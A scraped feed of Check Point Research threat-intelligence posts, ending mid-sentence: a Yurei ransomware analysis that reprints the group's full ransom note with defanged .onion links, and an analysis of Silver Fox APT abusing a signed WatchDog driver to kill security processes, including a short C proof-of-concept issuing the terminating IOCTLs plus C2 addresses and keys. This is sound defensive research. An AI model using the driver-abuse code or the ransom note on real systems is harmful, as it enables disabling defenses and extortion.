{"source": "blog", "feed": "https://research.checkpoint.com/feed/", "title": "15th September – Threat Intelligence Report", "url": "https://research.checkpoint.com/2025/15th-september-threat-intelligence-report/", "published": "Mon, 15 Sep 2025 12:43:38 +0000", "content": "For the latest discoveries in cyber research for the week of 15th September, please download our Threat Intelligence Bulletin.\nTOP ATTACKS AND BREACHES\nCheck Point Threat Emulation provides protection against this threat (Ransomware.Wins.INC)\nCheck Point Threat Emulation and Harmony Endpoint provide protection against this threat (Ransomware.Win.RansomHub; Ransomware.Wins.RansomHub.ta.*)\nVULNERABILITIES AND PATCHES\nCheck Point Threat Emulation and Harmony Endpoint provide protection against this threat (Ransomware.Wins.Akira.ta.*; Ransomware.Wins.Akira; Trojan.Wins.Akira.ta.*; Trojan.Wins.Akira; Trojan.Win.Akira)\nTHREAT INTELLIGENCE REPORTS\nCheck Point Threat Emulation and Harmony Endpoint provide protection against this threat\nCheck Point Threat Emulation and Harmony Endpoint provide protection against this threat (InfoStealer.Win.Lumma; InfoStealer.Wins.Lumma; InfoStealer.Wins.Lumma.ta.*; Trojan.Wins.Lumma.ta.*)", "timestamp": "2025-10-21T13:36:00.878136"}
{"source": "blog", "feed": "https://research.checkpoint.com/feed/", "title": "Yurei & The Ghost of Open Source Ransomware", "url": "https://research.checkpoint.com/2025/yurei-the-ghost-of-open-source-ransomware/", "published": "Fri, 12 Sep 2025 12:50:09 +0000", "content": "Check Point Research discovered a new ransomware group on September 5. The group calls themselves Yurei (a sort of spirit in Japanese folklore), and initially listed one victim, a Sri Lankan food manufacturing company, on their darknet blog. These blogs are used by ransomware groups to list their victims, show proofs of compromise such as screenshots of internal documents, and to provide a secure chat interface where the victim can negotiate with the operators. In the first few days of the operation, two new victims were listed, one from India and one from Nigeria, making a total of three as of September 9.\nFigure 1 — Yurei ransomware site on September 5.\nThe Yurei ransomware is written in the Go programming language. While malware in Go is not uncommon, it still provides a challenge for some Antivirus vendors to detect. Combined with an easier development experience than C or C++ and the ability to cross-compile to different platforms, Go continues to be an attractive choice for malware developers.\nIn this case, the threat actor made the mistake of not stripping symbols from the binary. Therefore, function and module names were preserved, through which it becomes clear that Yurei’s ransomware is largely based on an open-source ransomware named Prince-Ransomware (currently only available as a reupload on GitHub), with only minor modifications. This same ransomware codebase was already used in campaigns by other actors, such as in the case of CrazyHunter.\nThe ransom note is dropped as _README_Yurei.txt\nand instructs the victim to visit their site and enter their chat using a provided access token for further negotiation. Upon payment, the threat actor claims to provide a decryption tool as well as a report of the vulnerabilities exploited to compromise the environment, akin to a report of a penetration test.\nThe victim is provided with the negotiation .onion page, where the victim and threat actors can communicate and negotiate the price of decryption and deletion of the stolen data as well as assurances against publishing corporate files.\nAs stated previously, Yurei is an offshoot of the open-source Prince-Ransomware, written in Go, with minor modifications. On a high level, the ransomware takes the following actions:\n.Yurei\nextensionFiles are encrypted using the ChaCha20 algorithm and are appended the .Yurei\nextension. The ransomware generates a random ChaCha20 key and a random nonce per file and then encrypts both with ECIES using the attacker’s public key. The encrypted files then store the encrypted key, nonce, and file content, separated by the ||\ncharacters:\nThe authors of the ransomware did not implement any anti-analysis features, such as obfuscation, but instead even included symbols in the shipped binary.\nThe same module names, filewalker\n, encryption\nand configuration\nare also used by the Open Source Prince-Ransomware:\nFurther inspection of the code that changes the wallpaper confirms the suspicion that Yurei is based on Prince-Ransomware.\nYurei carries over an unaltered set of the same PowerShell commands.\nThe first command is supposed to download a wallpaper from a remote URL and save it as Wallpaper.png\nin the %TEMP%\ndirectory. The next command then compiles a .NET assembly to call SystemParametersInfo\nwith SPI_SETDESKWALLPAPER\nto set the current wallpaper.\nUsually, ransomware sets the wallpaper to a sort of Logo or ransom note. Interestingly, the Yurei developers did not supply a wallpaper to be downloaded. Therefore, the malware runs a download command via PowerShell that errors out due to a missing URL. As the wallpaper is set to a non-existing file in the subsequent PowerShell command, Windows falls back to setting the background to a single color, e.g., black.\nExamining the builder’s source code on GitHub reveals that the binary is shipped with symbols because the builder does not set the appropriate linker flags to strip them from the binary. The threat actors likely did not touch the builder code at all.\nWhile most of the source code was not modified, the code to enumerate which files and drives to encrypt differs slightly from the publicly available version on GitHub. While the original repository uses single-threaded encryption, Yurei makes use of goroutines, Go’s concurrency mechanism, to encrypt each drive concurrently:\nOnce the encryption is finished, the malware enters a new routine which continuously monitors for new network drives to add to the encryption queue:\nWhile there is no evidence that this was AI-assisted development, these types of modifications on top of existing codebases can easily be performed even by lower-skilled developers, using simple prompts on Large Language Models (LLMs).\nAlthough the threat actor modified the codebase, the Yurei ransomware still has a major flaw: It does not delete existing Shadow copies. Shadow copies are backup snapshots of files or entire volumes that, if enabled, are generated by the Volume Shadow Copy Service (VSS). Ransomware usually targets and deletes these copies to block victims from using Windows’ built-in recovery options.\nAs Yurei does not include this functionality, if Shadow Copies are enabled, the Victim can restore their files to a previous snapshot without having to negotiate with Yurei. This oversight again shows the lack of sophistication this threat actor employs in its operation. As a result, activating VSS and continuously taking snapshots of systems is highly recommended as a protective measure against threats such as Yurei. However, ransomware groups are increasingly shifting to data-theft-based extortion, so this only aids in operational recovery but does not protect against extortion. As Yurei states on their blog, the main pressure point for victims paying the ransom is the threat of data leakage. This has major implications for businesses, and in the case of e.g. Midcity Marketing, can also affect food security and state supply chains.\nLooking at the samples on VirusTotal shows that all samples were first submitted from Morocco. One sample did not include a ticket ID, indicating that this could be a test build, possibly uploaded by the developer themselves. It is possible that the threat actor may have used VirusTotal as a means to test the detection rate of his ransomware, once again showing that we are dealing with a low-skilled actor.\nWhen we analyzed the HTML source code of the .onion page, we found a comment in Arabic:\nThe path artifacts from the available samples all list the local path as D:\\satanlockv2\\*\n, indicating possible ties to the SatanLockv2 ransomware. Looking at other samples of SatanLockv2, they were first uploaded from Morocco and based on Prince-Ransomware as well.\nAs a result, we assess with low confidence that the threat actor is based in Morocco.\nYurei demonstrates how easily threat actors can weaponize open open- source ransomware projects with only minimal modifications, enabling low-level threat actors to enter the ransomware business without the necessary development skills or even investing much effort. By reusing the codebase of Prince-Ransomware, the group managed to launch operations quickly but also inherited its flaws, most notably the failure to remove Volume Shadow Copies. This oversight enables partial recovery in environments where VSS is enabled. As ransomware groups increasingly focus on data-theft-based extortion, however, this flaw, does not have a critical impact on the ransomware operation’s success.\nWhile open-source malware is a threat, it also gives defenders opportunities to detect and mitigate these variations. However, Yurei succeeded in running their operation on several victims, which shows that even low-effort operations can still lead to success\nCheck Point Threat Emulation and Harmony Endpoint provide comprehensive coverage of attack tactics, file types, and operating systems and protect against the attacks and threats described in this report.\n--== Yurei ==-- Dear Management, If you are reading this message, it means that: ├─ Your company’s internal infrastructure has been fully or partially compromised. ├─ All your backups — both virtual and physical — and everything we could access have been completely wiped. └─ Additionally, we have exfiltrated a large amount of your corporate data prior to encryption. We fully understand the damage caused by locking your internal resources. Now, let’s set emotions aside and try to build a constructive dialogue. WHAT YOU NEED TO KNOW ├─ Dealing with us will save you a lot — we have no interest in financially destroying you. ├─ We will thoroughly analyze your finances, bank statements, income, savings, and investments, and present a reasonable demand. ├─ If you have active cyber insurance, let us know — we will guide you on how to properly use it. └─ Dragging out negotiations will only cause the deal to fail. PAYMENT BENEFITS ├─ Paying us saves time, money, and effort — you can be back on track within approximately 24 hours. ├─ Our decryptor works perfectly on all files and systems — you can request a test decryption at any time. └─ Attempting recovery on your own may result in permanent file loss or corruption — in such cases, we won’t be able to help. SECURITY REPORT & EXCLUSIVE INFO ├─ The report and first-hand insights we provide upon agreement are invaluable. └─ No full network audit will reveal the specific vulnerabilities we exploited to access your data and infrastructure. WHAT HAPPENED ├─ Your network infrastructure has been compromised. ├─ Critical data has been exfiltrated. └─ Files have been encrypted. WHAT YOU SHOULD NOT DO ├─ Do NOT rename, modify, or delete encrypted files. ├─ Do NOT shut down your system or run antivirus software — this may cause irreversible damage. └─ Do NOT waste time with data recovery companies — they cannot help you. VALUABLE DATA WE USUALLY STEAL ├─ Databases, legal documents, and personal information ├─ Audit reports, SQL databases ├─ Financial documents: statements, invoices, accounting data ├─ Work files and corporate communications ├─ Any backup solutions └─ Confidential documents TO DO LIST (Best Practices) ├─ Contact us as soon as possible via our live chat (only). ├─ Purchase our decryption tool — there is no other way to recover your data. ├─ Avoid third-party negotiators or recovery services. └─ Do not attempt to use public decryption tools — you risk permanent data loss. RESPONSIBILITY ├─ Violating the terms of this offer will result in: │ - Deletion of your decryption keys │ - Immediate sale or public disclosure of your leaked data │ - Notification of regulatory agencies, competitors, and clients --- **CHAT:** Yurei CHAT:hxxp://fewcriet5rhoy66k6c4cyvb2pqrblxtx4mekj3s5l4jjt4t4kn4vheyd.onion/chat/<VICTIM-GUID/chat.php Your Ticket ID: <TICKET-ID> Blog:hxxp://fewcriet5rhoy66k6c4cyvb2pqrblxtx4mekj3s5l4jjt4t4kn4vheyd.onion --- Thank you for your attention. --- **Important Notes:** - Renaming, copying, or moving encrypted files may break the cipher and make decryption impossible. - Using third-party recovery tools can irreversibly damage encrypted files. - Shutting down or restarting the system may cause boot or recovery errors and further damage the encrypted data.", "timestamp": "2025-10-21T13:36:01.483097"}
{"source": "blog", "feed": "https://research.checkpoint.com/feed/", "title": "Chasing the Silver Fox: Cat & Mouse in Kernel Shadows", "url": "https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/", "published": "Thu, 28 Aug 2025 12:55:27 +0000", "content": "amsdk.sys\n(WatchDog Antimalware, version 1.0.600). This driver, built on the Zemana Anti-Malware SDK, was Microsoft-signed, not listed in the Microsoft Vulnerable Driver Blocklist, and not detected by community projects like LOLDrivers.wamsdk.sys\n, version 1.1.100). Although we promptly reported that the patch did not fully mitigate the arbitrary process termination issue, the attackers quickly adapted and incorporated a modified version of the patched driver into the ongoing campaign. By flipping a single byte in the unauthenticated timestamp field, they preserved the driver’s valid Microsoft signature while generating a new file hash, effectively bypassing hash-based blocklists. This subtle yet efficient evasion technique mirrors patterns seen in earlier campaigns.While Microsoft Windows has steadily strengthened its security model—through features like Protected Processes (PP/PPL) and enhanced driver verification—threat actors have adapted by shifting their tactics to exploit lower-level weaknesses that bypass these protections without triggering defenses. Among the most effective of these techniques is the abuse of vulnerable kernel-mode drivers, particularly those capable of arbitrary process termination. These drivers, when exploited, can disable or neutralize endpoint protection products, creating a clear path for malware deployment and persistence.\nIn this publication, we present our findings on a recently detected in-the-wild (ITW) campaign that leverages such a driver-based evasion technique. At the center of this operation is the Silver Fox APT, which used an unknown-to-be-vulnerable WatchDog Antimalware driver, (amsdk.sys\n, version 1.0.600), to terminate processes associated with security solutions and facilitate the delivery of the ValleyRAT backdoor. This driver, although built upon the same SDK (Zemana Anti-Malware SDK) as previously known vulnerable components, was not classified as vulnerable, was signed by Microsoft, and not detected by Microsoft’s Vulnerable Driver Blocklist or community-driven sources like the LOLDrivers database.\nOur research builds upon the vulnerable driver detection methodology we published in 2024, where we identified thousands of at-risk drivers, including those used in security solutions. One of the previously reported drivers from that research, the WatchDog Antimalware driver, is now confirmed as abused ITW in this campaign. The attackers used this driver to disable core EDR (Endpoint Detection and Response) and antivirus protections before delivering their final payload: ValleyRAT, a modular backdoor attributed to Silver Fox APT, with infrastructure located in China.\nThe campaign’s architecture is centered around all-in-one loader samples, which combine anti-analysis features, embedded drivers, EDR/AV killer logic, and the ValleyRAT downloader into a single binary. These loaders are tailored to function across both legacy and modern systems (Windows 7 – Windows 10/11), using two different drivers to ensure compatibility. While one of the drivers—a legacy Zemana-based driver (ZAM.exe\n)—is already known and blocked, the second driver used in modern environments was previously unknown and therefore remained undetected.\nWe provide a comprehensive analysis of the observed campaign, detailing how the attackers:\nIn addition, we discuss the implications of signed-but-exploitable drivers and the broader risks posed by attackers leveraging modified versions of previously patched components. We reported all relevant findings to Microsoft’s MSRC and the Watchdog company, resulting in partial mitigations but the campaign continues to evolve.\nIn late May 2025, we observed an ITW attack attributed to the Silver Fox APT group which targeted Windows systems with a custom loader designed to abuse kernel drivers to terminate security-related processes. The campaign marked a significant shift from using only known vulnerable drivers to deploying a previously unclassified, signed vulnerable driver that bypassed traditional detection mechanisms.\nThe abuse focused on two drivers, both derived from the Zemana Anti-Malware SDK. The first, Advanced Malware Protection driver (ZAM.exe\n, version 3.0.0.000), is long known for its weaknesses and is blocked by the Microsoft Vulnerable Driver Blocklist. Its inclusion in the campaign served compatibility purposes for older systems like Windows 7.\nMore critically, the attackers deployed WatchDog Antimalware driver (amsdk.sys\n, version 1.0.600), which despite sharing the same SDK foundation, was not publicly known to be vulnerable, not on any blocklist, and was signed by Microsoft—enabling it to be loaded even on fully updated Windows 10/11 systems.\nThese drivers facilitated arbitrary process termination, including processes running under PP/PPL protection, which enabled the campaign’s custom EDR/AV killer logic to disable a wide range of security solutions.\nEach malware sample we analyzed was a self-contained all-in-one loader, composed of:\nThroughout the short monitoring window, we observed the campaign evolve to include multiple variants of these loaders and driver combinations. Some samples integrated new drivers still not known to be vulnerable, suggesting an ongoing effort to evade detections and bypass updated defenses.\nFollowing our disclosure, Watchdog company released a patched version of the WatchDog Antimalware driver (wamsdk.sys\n, version 1.1.100). While this patch mitigated local privilege escalation (LPE) vectors, the updated driver still allowed arbitrary process termination, including protected processes, thereby failing to fully close the original attack vector. We disclosed this remaining issue to the vendor.\nSoon afterwards, we identified a new sample abusing a modified version of the patched driver, once again attributed to the same APT group. The attackers altered a single byte in the unauthenticated timestamp field of the driver’s Microsoft Authenticode signature. Because this field is not covered by the main signature digest, the driver remained validly signed and trusted by Windows, while presenting a new file hash and therefore bypassing hash-based blocklists. This subtle yet powerful evasion technique mirrors those seen in our earlier publication on large-scale legacy driver exploitation.\nThe final payload across all samples was ValleyRAT, also known as “Winos”. This RAT offers a full set of capabilities for remote surveillance, command execution, and data exfiltration. Its use, along with infrastructure hosted in China and targeted security process lists aligned with East Asian vendors, confirms the campaign’s attribution to Silver Fox APT.\nThis campaign demonstrates how threat actors are moving beyond known weaknesses to weaponize unknown, signed drivers—a blind spot for many defense mechanisms. The exploitation of a Microsoft-signed, previously unclassified vulnerable driver, combined with evasive techniques such as signature manipulation, represents a sophisticated and evolving threat. Despite some mitigations by the vendor, the attacker’s ability to quickly adapt—evidenced by the use of altered but validly signed driver variants—highlights the need for proactive, behavior-based detection methods and deeper scrutiny of signed kernel-mode drivers.\nAll detected command-and-control (C2) servers used in the final stage of the attack, specifically for deploying the ValleyRAT backdoor, are hosted within China, often leveraging public cloud or web services.\nThe victimology suggests a globally distributed targeting pattern. In most observed cases, the malware is delivered via .rar\narchives containing either a single executable (.exe\n) or a dynamic-link library (.dll\n) that is side-loaded through a legitimate application. The exact infection vector remains unidentified.\nAs detailed in Appendix A – List of Processes to be Terminated, the malware is configured to terminate processes associated with security and antivirus solutions commonly used in China. Combined with the geographic location of the C2 infrastructure, this strongly suggests that the primary targets are located in Asia, particularly within China.\nAll samples we analyzed were deployed as self-contained, all-in-one loaders. The loader is composed of several parts, each with a specific role:\nIn most cases (~75 % of detected samples) these loaders are not packed. Occasionally, however, the attackers use unaltered versions of common public packers, such as UPX.\nOne such example is a 64-bit, UPX-packed PE with the internal name Runtime Broker\n. The sample retains its original compilation timestamp, 2025-06-03 06:38:30 UTC, roughly two weeks after we first observed the campaign in the wild.\nAnti-analysis Techniques\nUpon execution, the sample performs a few common anti-analysis checks, such as Anti-VM (detection of virtual environments), Anti-Sandbox (detection of execution within a sandbox), hypervisor detection, and others. If any of these checks fail, the execution is aborted, and a fake system error message is displayed.\nThe virtual environment and hypervisor detection routines include a defined exclusion that allows execution to continue if the computer name is set to any of the following values: DESKTOP-T3N3M3Q\n, DESKTOP-03AMF90\n, or WIN-VMHH95J6C26\n. We believe this exclusion is intended to prevent execution from being aborted on systems used by the attackers during malware development.\nWe observed that some of the detected samples include an additional anti-analysis check using the public service http[://]ip-api[.]com/json\n. This service is used to retrieve information about the infected machine’s public IP address, including the ISP (Internet Service Provider) and ORG (Organization) fields.\nIf the ISP or ORG values match any entry from a predefined list (shown in the table below), the process is terminated, and a fake error message, “The program does not support your configuration.”, is displayed.\nPersistence Settings\nTo establish persistence, the loader creates a folder named RunTime\nunder the system path C:\\Program Files\\RunTime\n. The all-in-one loader sample and the appropriate version of the vulnerable driver—selected based on the infected system’s Windows OS version—are dropped into this folder with the filenames RuntimeBroker.exe\nand Amsdk_Service.sys\n, respectively.\nSubsequently, specific services are created to ensure the dropped files are executed automatically on system startup. The service named Termaintor\nis responsible for maintaining persistence for the previously dropped copy of the all-in-one loader (RuntimeBroker.exe\n).\nThe second created service, Amsdk_Service\n, is simply a configured registry key required to load the dropped vulnerable driver.\nWe believe the name Termaintor\nis a deliberate typographical error and also a possible indication that the EDR/AV killer logic was inspired by the publicly available PoC—a tool named “Terminator” that abuses the known vulnerable Zemana Anti-Malware driver.\nEmbedded Payloads\nWhile most globally defined strings in the analyzed sample are simply Base64-encoded, the embedded payloads use a combination of hexadecimal encoding and Base64. These payloads are embedded directly as encoded byte strings within the .rdata\nsection of the binary.\nTwo of the encoded payloads are different vulnerable drivers used by the EDR/AV killer logic. Only one of them is deployed on the infected system, depending on the detected Windows version.\nThe older driver is a 64-bit, validly signed Advanced Malware Protection driver, ZAM.exe\n, version 3.0.0.000. This driver is already known to be vulnerable and is detected by both LOLDrivers and the Microsoft Vulnerable Driver Blocklist. It is used only if the infected system is running an older version of Windows (e.g., Windows 7).\nThe newer driver is a 64-bit, validly signed WatchDog Antimalware driver, amsdk.sys\n, version 1.0.600. This driver was not previously known to be vulnerable and bypasses both LOLDrivers and Microsoft’s blocklist. It is used only if the infected system is running a modern version of Windows (e.g., Windows 10 or 11).\nThe final embedded payload is the encoded ValleyRAT downloader module, including its hardcoded configuration.\nValleyRAT Downloader\nAs previously mentioned, the ValleyRAT downloader stage is embedded within the all-in-one loaders in an encoded format combining Base64 and hexadecimal string. Once decoded, it results in a 64-bit, UPX-packed DLL that is converted into shellcode. This shellcode includes a stub responsible for in-memory reflective loading and is injected into an already running process, typically an instance of svchost.exe\n.\nThe internal name of the DLL, 上线模块.dll\n(translated as “Online module.dll”), is preserved in the Export Directory, along with three exported functions: load\n, run\n, and a second run\n.\nThe exported functions provide alternative entry points for executing and loading the DLL, such as using a custom-supplied configuration instead of the hardcoded one, while ultimately triggering the same core logic as the DllMain\nfunction.\nThe C2 servers are defined in the embedded configuration. Notably, both the IP addresses and ports are stored in reverse order. For example: 156[.]234[.]58[.]194:52110\nand 156[.]234[.]58[.]194:52111\n.\nThe communication between the ValleyRAT downloader and the C2 servers is encrypted using a simple XOR cipher with the key 363636003797e4383a36\n. After decrypting the traffic, we found that the downloaded content includes the final payload: the ValleyRAT backdoor (also known as Winos).\nThe EDR/AV killer routine is embedded directly within the all-in-one loaders.\nInitially, depending on the Windows version of the infected system, one of the two embedded vulnerable drivers is dropped. As both drivers are based on the Zemana Anti-Malware SDK, the exploitation logic remains the same i.e. abusing their ability to terminate arbitrary processes.\nThe figure below shows the routine responsible for creating the service required to load the vulnerable driver. Specifically, the service Amsdk_Service\n(of type SERVICE_KERNEL_DRIVER\n) is created using the Windows API functions RegCreateKeyW\nand RegSetValueExW\n, followed by a call to the NT API NtLoadDriver\nto initiate the driver loading process.\nOnce the driver is loaded, its created device amsdk\nis opened to enable communication with the driver, which is later used in the main EDR/AV killing routine (KillEDRMain\nfunction).\nThe core EDR/AV killer logic, implemented in the KillEDRMain\nfunction, iterates over a Base64-encoded list of target processes to be terminated. This list, defined as TERMINATE_PROCESS_LIST\n, contains 192 unique process names (see Appendix A – List of Processes to be Terminated). When any of the listed processes is found running on the system, it is terminated by issuing a sequence of IOCTLs, 0x80002010\n(IOCTL_REGISTER_PROCESS\n) followed by 0x80002048\n(IOCTL_TERMINATE_PROCESS\n), via the Windows API function DeviceIoControl\nthat communicates directly with the driver’s device.\nWe provide further details about the drivers abused in this campaign, including descriptions of the vulnerabilities, their impact, and example PoC code, in the following section.\nWhile the all-in-one loaders described in the previous section can abuse two versions of vulnerable drivers (depending on the targeted Windows system version), both are based on the Zemana Anti-Malware SDK. In this section, we shift our focus to the one not previously known to be vulnerable, despite its exploitation and impact being almost identical to the known variant.\nAs mentioned earlier, the abused driver, WatchDog Antimalware driver version 1.0.600, is a 64-bit, validly signed Windows kernel device driver. It is still actively used and was originally part of the Watchdog Anti-Malware product.\nEven though the internal name is amsdk.sys\n, the original PDB path still references zam64.pdb\n, suggesting reuse of the Zemana Anti-Malware SDK.\nWe confirmed that the WatchDog Antimalware driver is indeed based on the Zemana Anti-Malware SDK through a detailed inspection of its code. Some parts of the code (not just the metadata of the compiled PE) were changed by the WatchDog Antimalware developers, particularly those responsible for the driver’s device creation. These changes were likely made in response to the well-known vulnerabilities affecting drivers derived from the Zemana Anti-Malware SDK. In fact, there are publicly available PoCs (for over two years) exploiting “Zemana” drivers as EDR/AV killing tools, such as Terminator.\nAs this driver is signed by Microsoft (Microsoft Windows Hardware Compatibility Publisher), it can be loaded and used even on the latest fully updated Windows 10/11 systems. In addition, due to the diversity of the WatchDog Antimalware driver, common detection and prevention mechanisms, such as LOLDrivers and the Microsoft Vulnerable Driver Blocklist which cover “Zemana” drivers, are ineffective against the WatchDog Antimalware driver. As a result, there is no obstacle to its use.\nDespite modifications to the codebase intended to mitigate known vulnerabilities in “Zemana” drivers, the WatchDog Antimalware driver remains vulnerable with similar impacts, including LPE, unrestricted raw disk read/write access, arbitrary process termination, and more.\nThere are multiple vulnerabilities affecting the WatchDog Antimalware driver. First, the driver can terminate arbitrary processes without verifying whether the process is running as protected (PP/PPL), which is common for Anti-Malware services. As a result, it is a convenient candidate for the BYOVD (Bring Your Own Vulnerable Driver) technique where it is abused as an EDR/AV killer.\nBYOVD attacks are not usually considered vulnerabilities in the traditional sense, as the attacker must first deploy and load the vulnerable driver on the targeted system. These are procedures that require Administrator privileges (elevation from Administrator to System does not cross a security boundary). However, if the driver is already present on the targeted system (e.g., as part of the Watchdog Anti-Malware product), even a non-privileged user can abuse it to disable security solutions.\nA more critical driver vulnerability is its ability to cross the security boundary from a non-privileged user to System, resulting directly in LPE (Local Privilege Escalation). The root cause lies in the routine responsible for the driver’s device creation.\nIoCreateDeviceSecure\n, a more secure kernel function than IoCreateDevice\nbecause it lets you specify a DACL, is used. A strong DACL is set on the created device via the SDDL string D:P(A;;GA;;;SY)(A;;GA;;;BA)\n, granting access only to System and Administrators, but the DeviceCharacteristics\ndo not explicitly include the FILE_DEVICE_SECURE_OPEN\nflag. Without this flag as part of the device characteristics, the strong DACL does not apply to the entire device namespace, allowing even non-privileged users to communicate with the device.\nExplanation – Device Namespace & FILE_DEVICE_SECURE_OPEN\nEvery device has its own namespace, where names in the namespace are paths that begin with the device´s name. For a device named \\Device\\DeviceName\n, its namespace consists of any name with the form \\Device\\DeviceName\\anyfile\n. The lack of the FILE_DEVICE_SECURE_OPEN\nflag can be abused to obtain a full access handle to the device itself, even by a non-privileged user, because the strong DACL is not propagated to the namespace, e.g., opening a handle to \\Device\\DeviceName\\anyfile\nwill return a handle for the device itself \\Device\\DeviceName\n.\nBelow, we can see the driver´s initialization routine, where the device object is created with a strong DACL, but without the FILE_DEVICE_SECURE_OPEN\ncharacteristics flag.\nThe converted DACL, part of the SDDL string:\nBy combining unrestricted access to the driver’s device with its ability to perform privileged operations, all of the previously described vulnerabilities can be exploited. These capabilities of the WatchDog Antimalware driver are triggered by issuing specific IOCTLs during communication with the device.\nThe most critical examples are summarized in the table below:\nBelow is a simplified view of the DispatchDeviceControl\ncallback function, which is responsible for handling IOCTL requests and executing the corresponding routines.\nThe arbitrary process termination capability, abused by the threat actor in the campaign we describe here, is triggered via the IOCTL 0x80002048\n(IOCTL_TERMINATE_PROCESS\n), which directly invokes the TerminateProcessById\nfunction. Notably, before this action, the attacker-controlled process must first register itself (be added to the allowlist to bypass mitigation) by issuing IOCTL 0x80002010\n(IOCTL_REGISTER_PROCESS\n).\nThe TerminateProcessById\nfunction blocks termination only if the target process is marked as critical (to prevent a system crash). However, it does not handle protected processes (PP/PPL), which are typically used by anti-malware services. As a result, security solution processes can be freely terminated.\nThe PoC demonstrating the driver’s arbitrary process termination capability is relatively simple and the exploit can be implemented as follows:\n#define IOCTL_REGISTER_PROCESS 0x80002010 #define IOCTL_TERMINATE_PROCESS 0x80002048 // Loading the amsdk.sys driver DWORD pidTerminate = 1337; // Pid of process to be killed, PP/PPL processes possible DWORD pidRegister = GetCurrentProcessId(); HANDLE hDevice = CreateFileA(\"\\\\\\\\.\\\\amsdk\\\\anyfile\", GENERIC_READ | GENERIC_WRITE, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); DeviceIoControl(hDevice, IOCTL_REGISTER_PROCESS, &pidRegister, sizeof(pidRegister), NULL, 0, NULL, NULL); DeviceIoControl(hDevice, IOCTL_TERMINATE_PROCESS, &pidTerminate, sizeof(pidTerminate), NULL, 0, NULL, NULL);\nThe core of the vulnerability in the WatchDog Antimalware driver is not complex and can easily be addressed. Specifying the FILE_DEVICE_SECURE_OPEN\ndevice characteristic ensures the propagation of the strong DACL to the whole device namespace and prevents access by non-privileged users. An additional check to verify if the targeted process to be terminated is running as protected (PP/PPL) will mitigate the possibility of disabling Anti-Malware solutions.\nAll the samples we analyzed (see Appendix B – IOCs) deployed the well-known ValleyRAT backdoor (also known as Winos) as the final stage. This malware strain is strongly attributed to, and associated with, the well-known APT group Silver Fox.\nSimilar to the ValleyRAT downloader, the deployed ValleyRAT backdoor is delivered as a 64-bit DLL converted to shellcode (the DLL is preceded by stub shellcode responsible for in-memory reflective loading).\nThe internal name 登录模块.dll\n(translated as “LoginModule.dll”) of this DLL is preserved in the Export Directory, along with a single exported function, run\n. This exported function is almost identical to DllMain\n, triggers the same main logic, and likely serves as an alternate execution mechanism.\nOne of the first executed functions to avoid detection is a callback invoked via the Windows API EnumWindows\n. The callback function, EnumFunc\n, is responsible for detecting processes with window titles associated with analysis tools, primarily those used for network analysis, commonly found in sandboxes or malware labs. If any of the defined window titles is detected, execution is delayed by a 20-second sleep, and the enumeration continues until none of the tools are detected.\nThe identical routine was already described in ValleyRAT Insights: Tactics, Techniques, and Detection Methods. As the ValleyRAT backdoor and its stages were thoroughly analyzed in several publicly available reports, a detailed analysis of the version deployed in this campaign is considered out of the scope for this publication.\nAs previously described, the attackers abuse two vulnerable drivers to terminate processes associated with security solutions. While the older one—Advanced Malware Protection driver, ZAM.exe\n, version 3.0.0.000—was classified as known-vulnerable by the Microsoft Vulnerable Driver Blocklist and by other common detection mechanisms such as those implemented by the LOLDrivers project, the newer one—WatchDog Antimalware driver, amsdk.sys\n, version 1.0.600—bypasses all of them.\nAs we saw, the all-in-one loaders used in this campaign are tailored to support not only the latest versions of Windows OS (Windows 10/11) but also older ones (e.g., Windows 7), meaning even legacy systems remain at risk.\nThe Microsoft Vulnerable Driver Blocklist uses advanced detection mechanisms, beyond simple hash-based checks, to protect against known vulnerable drivers. As it is built into the Windows OS, we reported the issue to MSRC.\nAs the primary risk in this detected in-the-wild campaign stems from the previously unknown vulnerable WatchDog Antimalware driver, we reported the campaign and the driver abuse to its vendor, the Watchdog company. As a result, the vendor released a patch: WatchDog Antimalware driver, wamsdk.sys\n, version 1.1.100. All Watchdog products are now deployed with this updated version of the driver.\nWe confirmed that the new driver mitigates the LPE risk by enforcing a strong DACL (allowing access only for SYSTEM and Administrator accounts) and by setting the FILE_DEVICE_SECURE_OPEN\ndevice characteristic, which ensures the propagation of the DACL across the entire device namespace.\nUnfortunately, it does not mitigate the arbitrary process termination issue. It still lacks a check for whether the targeted process is running as protected (PP/PPL). As a result, this driver can still be abused similarly to how it was used in the described campaign to disable anti-malware solutions. We reported this to the vendor.\nAs anticipated, we already detected a sample in this campaign that abuses an altered variant of the released patched driver (WatchDog Antimalware Driver, wamsdk.sys\n, version 1.1.100).\nThis sample remains associated with the same campaign attributed to the Silver Fox APT, once again deploying the ValleyRAT backdoor as the final stage. We reported this new finding to the Watchdog company.\nThe patched driver (WatchDog Antimalware Driver, wamsdk.sys\n, version 1.1.100) is abused in a way where the attackers create a modified variant by altering just a single byte within the PE binary’s WIN_CERTIFICATE\nstructure—specifically in the unauthenticated attributes of the embedded Microsoft Authenticode signature. This byte is part of the RFC 3161 timestamp (counter-signature) applied by Microsoft’s time-stamping authority. Because unauthenticated attributes are not covered by the primary signature’s digest, this change does not affect the validity of the embedded Microsoft signature, and does not break the chain of trust. As a result, Windows continues to treat the driver as validly signed and trusted, even on the latest versions. However, the file’s overall hash (e.g., SHA-256) is now different, which allows attackers to create a modified, uniquely hashed but still validly signed version of the original driver.\nWe recommend manually applying the latest version of the Microsoft Vulnerable Driver Blocklist, as it is usually auto-updated only once or twice a year. As we cannot ensure that all the vulnerable drivers abused in this campaign will be added to the Microsoft Vulnerable Driver Blocklist, we provided YARA rules (see Appendix C – YARA) to detect them and recommend monitoring and preventing their abuse.\nWe revealed a sophisticated campaign, attributed to the Silver Fox APT group, that exploits vulnerable signed drivers to bypass security protections and deploy the ValleyRAT backdoor. By abusing two vulnerable drivers, one previously known and one newly identified, attackers achieved arbitrary process termination, allowing them to disable anti-malware solutions and maintain stealth across multiple Windows versions, including the latest Windows 10 and 11.\nThe newly identified abuse of the WatchDog Antimalware driver demonstrates that even signed and seemingly trusted drivers can contain critical vulnerabilities. The attackers’ technique of modifying unauthenticated attributes within the driver’s digital signature to evade detection while preserving trustworthiness exposes the limitations of relying solely on hash-based or signature-based detection methods.\nOur findings highlight the need for layered defense strategies, encompassing not only timely application of Microsoft’s Vulnerable Driver Blocklist and custom detection rules like YARA signatures, but also robust behavior-based detection capable of heuristically identifying and blocking such threats. These combined measures are vital to detect and prevent the abuse of vulnerable drivers before attackers can escalate privileges or disable security software.\nOur final point is that our research reinforces the need for ongoing efforts of security 